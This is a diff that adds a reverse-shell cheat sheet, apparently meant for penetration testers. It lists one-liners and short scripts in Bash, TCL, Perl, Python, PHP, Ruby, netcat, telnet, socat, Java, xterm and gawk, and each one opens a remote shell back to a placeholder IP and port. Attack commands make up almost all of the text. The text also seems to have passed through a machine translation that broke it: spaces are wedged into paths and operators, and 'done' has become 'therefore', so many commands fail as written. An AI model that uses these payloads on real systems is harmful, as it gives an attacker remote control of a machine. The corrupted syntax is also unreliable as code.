@@ -1,0 +1,191 @@
+Reverse Shell Collection...
+
+
+Some versions of Bash allow to transmit a reverse-shell via "/ dev / tcp /" or "/ dev / udp /" (version compiled with the flag "-enable-net-redirects").
+
+bash -i> & / dev / tcp / <IP> / <PORT> 0> & 1
+
+exec 5 <> / dev / tcp / <IP> / <PORT>; cat <& 5 | while read line; do $ line 2> & 5> & 5; therefore
+
+exec / bin / sh 0 </ dev / tcp / <IP> / <PORT> 1> & 0 2> & 0
+
+0 <& 196; exec 196 <> / dev / tcp / <IP> / <PORT>; sh <& 196> & 196 2> & 196
+
+-------------------------------------------------------------------------------------- 
+
+tclsh
+
+Often cited as an alternative to using "/ dev / tcp /" and "/ dev / udp /" when these are not available, TCL is a language that allows the use of sockets and command execution. In other words, adequate to establish a reverse-shell. TCL script for establishing a reverse-shell:
+
+#! / Usr / bin / tclsh
+set s [socket <IP> <PORT>];
+while {42} {
+puts -nonewline $ s "shell>";
+flush $ s;
+gets $ sc;
+set e "exec $ c";
+if {! [catch {set [eval $ e]} err]} {
+puts $ s $ r;
+}
+flush $ s;
+}
+close $ s;
+-----------------------------------------------------------------------------------------
+One-line version:
+
+echo 'set s [socket <IP> <PORT>]; while 42 {puts -nonewline $ s "shell>"; flush $ s; gets $ sc; set e "exec $ c"; if {! [catch {set r [eval $ e]} err]} {puts $ s $ r}; flush $ s; }; close $ s; ' | tclsh
+
+Perl
+Dependent version of "/ bin / sh":
+
+perl -e 'use Socket; $ i = "<IP>"; $ p = <PORT>; socket (S, PF_INET, SOCK_STREAM, getprotobyname ("tcp")); if (connect (S, sockaddr_in ($ p, inet_aton ($ i)))) {open (STDIN, "> & S"); open (STDOUT, "> & S"); open (STDERR, "> & S"); exec ("/ bin / sh -i") ;}; '
+
+----------------------------------------------------------------------------------------
+
+Independent version of "/ bin / sh" for Linux (with fork):
+
+perl -MIO -e '$ p = fork; exit, if ($ p); $ c = new IO :: Socket :: INET (PeerAddr, "<IP>: <PORT>"); STDIN-> fdopen ($ c, r); $ ~ -> fdopen ($ c, w); system $ _ while <>; '
+If the target system is a Windows (without fork):
+
+perl -MIO -e "$ c = new IO :: Socket :: INET (PeerAddr, '<IP>: <PORT>'); STDIN-> fdopen ($ c, r); $ ~ -> fdopen ($ c , w); system $ _ while <>; "
+
+----------------------------------------------------------------------
+Python
+
+python -c 'import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect (("<IP>", <PORT>)); os.dup2 (s.fileno (), 0); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2), p = subprocess.call ([ "/ bin / sh", "- i"]); '
+-----------------------------------------------------------------------
+PHP
+
+For each language, different local command execution functions are exploitable. As part of the PHP language, here are some examples with different functions:
+
+php -r '$ s = fsockopen ("<IP>", <PORT>); exec ("/ bin / sh -i <& 3> & 3 2> & 3");'
+ 
+php -r '$ s = fsockopen ("<IP>", <PORT>); shell_exec ("/ bin / sh -i <& 3> & 3 2> & 3");'
+ 
+php -r '$ s = fsockopen ("<IP>", <PORT>); `/ bin / sh -i <& 3> & 3 2> & 3`;'
+ 
+php -r '$ s = fsockopen ("<IP>", <PORT>); system ("/ bin / sh -i <& 3> & 3 2> & 3");'
+ 
+php -r '$ s = fsockopen ("<IP>", <PORT>); popen ("/ bin / sh -i <& 3> & 3 2> & 3", "r");'
+
+----------------------------------------------------------------------
+
+Ruby
+One-line dependent on "/ bin / sh":
+
+ruby -rsocket -e'f = TCPSocket.open ("<IP>", <PORT>). to_i; exec sprintf ("/ bin / sh -i <&% d> &% d 2> &% d", f, f, f) '
+Independent version of "/ bin / sh" for Linux (with fork):
+
+ruby -rsocket -e 'exit if fork; c = TCPSocket.new ("<IP>", "<PORT>"); while (cmd = c.gets); IO.popen (cmd, "r") {| io | c.print io.read} end '
+
+------------------------------------------------------------------------
+
+Version for Windows (without fork):
+
+ruby -rsocket -e "c = TCPSocket.new ('<IP>', '<PORT>'); while (cmd = c.gets); IO.popen (cmd, 'r') {| io | c. print io.read} end "
+
+----------------------------------------------------------------------------
+netcat
+
+Traditional version of netcat (netcat-traditional package) with "-c" or "-e" arguments available (GAPING_SECURITY_HOLE enabled):
+
+nc <IP> <PORT> -e / bin / bash
+ 
+/bin/nc.traditional <IP> <PORT> -e / bin / bash
+ 
+/bin/nc.traditional <IP> <PORT> -c / bin / bash
+
+-----------------------------------------------------------------------------
+
+For all other versions of netcat (including netcat-openbsd) that have been compiled with the "GAPING_SECURITY_HOLE" disabled:
+
+Via "mkfifo":
+rm f; mkfifo f; cat f | / bin / sh -i 2> & 1 | nc <IP> <PORT>> f
+ 
+rm f; mkfifo f; cat f | / bin / sh -i 2> & 1 | /bin/nc.openbsd <IP> <PORT>> f
+
+-----------------------------------------------------------------------------
+
+Via "mknod":
+
+rm -fx; mknod xp && nc <IP> <PORT> 0 <x | / bin / bash 1> x
+ 
+rm -fx; mknod xp && /bin/nc.openbsd <IP> <PORT> 0 <x | / bin / bash 1> x
+
+----------------------------------------------------------------------------
+Telnet
+
+The dual telnet, which performs a dual connection to the listener's machine on two different ports. The pentester must therefore place two netcat listening on two ports (1337 and 1338). The first netcat will enter the command and the second receive the results.
+
+telnet <IP> <PORT1> | / bin / bash | telnet <IP> <PORT2>
+Via "mkfifo":
+rm f; mkfifo f; cat f | / bin / sh -i 2> & 1 | telnet <IP> <PORT>> f
+Via "mknod":
+rm -fx; mknod xp && telnet <IP> <PORT> 0 <x | / bin / bash 1> x
+
+------------------------------------------------------------------
+
+socat
+
+In the line of tools to control network flows, Socat is one of the references. Rarely present by default in Linux distributions (only), it is possible to recover a reverse-shell through it:
+
+tcp-connect company: <IP>: <PORT> exec: "bash -li", pty, stderr, setsid, sigint, sane
+
+Socat allows bidirectional connections to establish fully interactive reverse-shell (with dead-keys, control keys ...), and natively supports SSL encryption, IPv6 ...
+
+--------------------------------------------------------------------------
+
+Java
+
+r = Runtime.getRuntime ()
+p = r.exec (["/ bin / bash", "- c", "exec 5 <> / dev / tcp / <IP> / <PORT>; cat <& 5 | while read line; do \ $ line 2 > & 5> & 5; done "] as String [])
+p.waitFor ()
+Code not tested, source PentestMonkey .
+
+------------------------------------------------------------------------------
+
+xterm
+
+Another method to obtain a reverse-shell is the use of the transfer of an xterm terminal. To do this, an X-Server must be present on the listener's machine. The "xnest" package makes this easy on Linux systems. You must also allow connections from the target machine.
+On the Pentester machine (listening on port 6001):
+
+Xnest: 1
+xhost + <IPTARGET>
+
+On the target machine:
+
+xterm -display <IP>: 1
+
+If the system is a Solaris, "xterm" is not part of the environment by default. Its full path must be filled in:
+
+/ usr / openwin / bin / xterm -display <IP>: 1
+
+---------------------------------------------------------------------------------------------------
+
+(G) awk
+
+Reverse-shell via Gawk, based on a simple shell script from  Phrack 62  :
+
+#! / usr / bin / awk -f
+BEGIN {
+s = "/ inet / tcp / 0 / <IP> / <PORT>"
+while (42) {
+do{
+printf "shell>" | & s
+s | & getline c
+if (c) {
+while ((c | & getline)> 0)
+print $ 0 | & s
+close (c)
+}
+} while (c! = "exit")
+close (s)
+}
+}
+
+
+For a "one-line" execution using "awk" developed by ASafety (or its GNU Gawk variant):
+
+awk 'BEGIN {s = "/ inet / tcp / 0 / <IP> / <PORT>"; while (42) {do {printf "shell>" | & s; s | & getline c; if (c) {while ((c | & getline)> 0) print $ 0 | & s; close (c); }} while (c! = "exit") close (s); }} '/ dev / null
+There are a multitude of techniques and methods for acquiring a reverse shell from a machine. Many of them depend on the tools and technologies available on the target machine. The few previous examples are relatively common in the most common distributions. This article aims to centralize and present some of these vectors. If another technique / syntax comes to your mind, feel free to share it!
+
